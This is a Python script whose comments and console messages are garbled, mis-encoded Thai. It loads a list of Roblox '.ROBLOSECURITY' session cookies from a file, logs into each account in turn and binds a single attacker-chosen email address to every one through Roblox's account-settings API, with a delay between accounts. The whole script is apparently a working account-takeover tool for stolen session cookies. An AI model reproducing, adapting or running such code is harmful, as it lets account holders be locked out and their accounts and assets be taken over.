import requests
import re
import time

def is_valid_email(email):
    email_regex = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
    return re.match(email_regex, email) is not None

# ‡πÇ‡∏´‡∏•‡∏î‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå email.txt
def load_email_from_file(file_path):
    with open(file_path, "r", encoding="utf-8") as file:
        email = file.readline().strip()  # ‡∏≠‡πà‡∏≤‡∏ô‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡∏à‡∏≤‡∏Å‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î‡πÅ‡∏£‡∏Å‡πÅ‡∏•‡∏∞‡∏•‡∏ö‡∏ä‡πà‡∏≠‡∏á‡∏ß‡πà‡∏≤‡∏á‡∏ó‡∏µ‡πà‡πÑ‡∏°‡πà‡∏à‡∏≥‡πÄ‡∏õ‡πá‡∏ô
    if not email:
        print("‚ùå ‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡πÉ‡∏ô‡πÑ‡∏ü‡∏•‡πå‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏î‡πâ‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•")
        return None
    if not is_valid_email(email):
        print("‚ùå ‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á")
        return None
    return email


# ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏î‡∏∂‡∏á CSRF Token
def get_csrf_token(session):
    res = session.post("https://auth.roblox.com/v2/logout")
    if res.status_code == 403:
        return res.headers.get("x-csrf-token")
    return None

# ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡∏ú‡∏π‡∏Å‡∏≠‡∏µ‡πÄ‡∏°‡∏•
def attach_email(cookie, email):
    session = requests.Session()
    session.cookies['.ROBLOSECURITY'] = cookie
    session.headers.update({
        "User-Agent": "Roblox/WinInet",
        "Referer": "https://www.roblox.com/",
        "X-CSRF-TOKEN": ""
    })

    csrf = get_csrf_token(session)
    if not csrf:
        print("  [!] ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏î‡∏∂‡∏á CSRF Token ‡πÑ‡∏î‡πâ")
        return
    session.headers['X-CSRF-TOKEN'] = csrf

    res = session.get("https://users.roblox.com/v1/users/authenticated")
    if res.status_code != 200:
        print("  ‚ùå Cookie ‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ")
        return
    username = res.json().get("name")
    print(f"  ‚úÖ ‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà‡∏£‡∏∞‡∏ö‡∏ö‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à: {username}")

    payload = {
        "emailAddress": email
    }

    res = session.post("https://accountsettings.roblox.com/v1/email", json=payload)

    if res.status_code == 200:
        print(f"  ‚úÖ ‡∏™‡πà‡∏á‡∏Ñ‡∏≥‡∏Ç‡∏≠‡∏¢‡∏∑‡∏ô‡∏¢‡∏±‡∏ô‡πÑ‡∏õ‡∏ó‡∏µ‡πà {email}")
    else:
        print(f"  ‚ùå ‡∏ú‡∏π‡∏Å‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß ({res.status_code}): {res.text}")

# ‡πÇ‡∏´‡∏•‡∏î cookie.txt (‡∏à‡∏≤‡∏Å path ‡πÄ‡∏î‡∏¥‡∏°‡∏´‡∏£‡∏∑‡∏≠‡πÅ‡∏Å‡πâ‡πÑ‡∏î‡πâ)
cookie_path = "cookie.txt"
with open(cookie_path, "r", encoding="utf-8") as cf:
    lines = cf.readlines()

# ‚úÖ ‡∏Å‡∏£‡∏≠‡∏á‡πÄ‡∏â‡∏û‡∏≤‡∏∞ cookie ‡∏ó‡∏µ‡πà‡∏Ç‡∏∂‡πâ‡∏ô‡∏ï‡πâ‡∏ô‡∏î‡πâ‡∏ß‡∏¢ _| ‡πÅ‡∏•‡∏∞‡∏¢‡∏≤‡∏ß‡∏û‡∏≠
cookies = [line.strip() for line in lines if line.strip().startswith("_|") and len(line.strip()) > 50]

# ‡πÇ‡∏´‡∏•‡∏î‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡∏à‡∏≤‡∏Å email.txt
email_path = "email.txt"
email = load_email_from_file(email_path)

print(f"üì® ‡πÉ‡∏ä‡πâ‡∏≠‡∏µ‡πÄ‡∏°‡∏•:{email}")
print(f"üîÅ ‡∏û‡∏ö {len(cookies)} cookie(s)\n")

# ‡∏î‡∏≥‡πÄ‡∏ô‡∏¥‡∏ô‡∏Å‡∏≤‡∏£‡∏Å‡∏±‡∏ö cookie ‡πÅ‡∏ï‡πà‡∏•‡∏∞‡∏≠‡∏±‡∏ô
for i, cookie in enumerate(cookies, 1):
    print(f"[{i}] ‡∏î‡∏≥‡πÄ‡∏ô‡∏¥‡∏ô‡∏Å‡∏≤‡∏£‡∏Å‡∏±‡∏ö cookie...")
    attach_email(cookie, email)
    print("-" * 50)
    time.sleep(10)